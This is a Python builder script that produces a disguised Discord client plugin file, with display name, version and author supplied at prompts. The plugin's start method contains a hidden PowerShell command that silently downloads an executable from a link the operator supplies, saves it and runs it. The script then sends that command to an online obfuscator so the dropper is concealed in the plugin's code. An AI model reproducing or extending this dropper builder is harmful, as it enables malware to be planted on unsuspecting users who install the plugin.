import requests
from urllib.request import unquote
from html import unescape
import re
top = f"""/**
 * @name {input("enter plugin's display name: ").replace(" ","_")}
 * @version {input("enter plugin version: ")}
 * @description {input("enter plugins description: ")}
 * @author {input("enter author: ").replace(" ","_")}
 *   
 */"""
code1="""
module.exports = class Gifhider{
    load() { }
    start() {
    
    """
filename1=input("enter dropped filename(ex: file.exe): ")
code2=f"""
 	
	var exec = require('child_process').exec;
	exec("powershell.exe -windowstyle hidden $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest {input("enter direct download link: ")} -OutFile '{filename1}'; powershell Start-Process -FilePath \\\"{filename1}\\\"", function (error, stdOut, stdErr) {{}});

"""
code3 = """

}
stop(){

}
}"""
code2=unescape(unquote(re.findall('eval.*\)\)\)',requests.post("https://www.cleancss.com/javascript-obfuscate/index.php",data={"ascii_encoding": 62, "src":code2},allow_redirects=False).text)[0]))
code = top+code1+code2+code3
filename=input("enter output filename: ")
with open(filename+".plugin.js","w") as f:
    f.write(code)
    f.close()
print(f"complete, saved to \"{filename}.plugin.js\"")
input()
